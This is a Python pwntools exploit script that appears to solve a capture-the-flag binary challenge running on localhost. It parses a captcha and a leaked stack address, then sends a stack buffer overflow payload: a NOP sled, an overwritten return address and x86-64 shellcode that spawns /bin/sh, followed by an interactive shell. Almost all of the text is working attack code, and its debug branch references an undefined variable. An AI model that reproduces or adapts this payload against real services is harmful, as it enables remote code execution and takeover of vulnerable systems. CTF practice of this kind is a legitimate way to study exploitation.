from pwn import *
import sys
DEBUG = False
host = "localhost"
port = 32774
offset = 48
context.log_level= 'debug'
# public shellcode
shellcode='\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' # /bin/sh

# step 1 find vulnerable func
if not DEBUG:
    p = remote(host, port)
    p.recvuntil("Captcha:")
    captcha = p.recvuntil('=')
    print(captcha)
    p.recvuntil('some hint: ')
    hint = "0x"+p.recvuntil(')')[:-1]
    hint = int(hint,16)
    ra = p64(hint+offset+8)
    p.sendline('\x90'*offset+ra+'\x90'*256+shellcode)
    p.interactive()
else:
    print('\x90'*offset+return_address+'\x90'*256+shellcode)
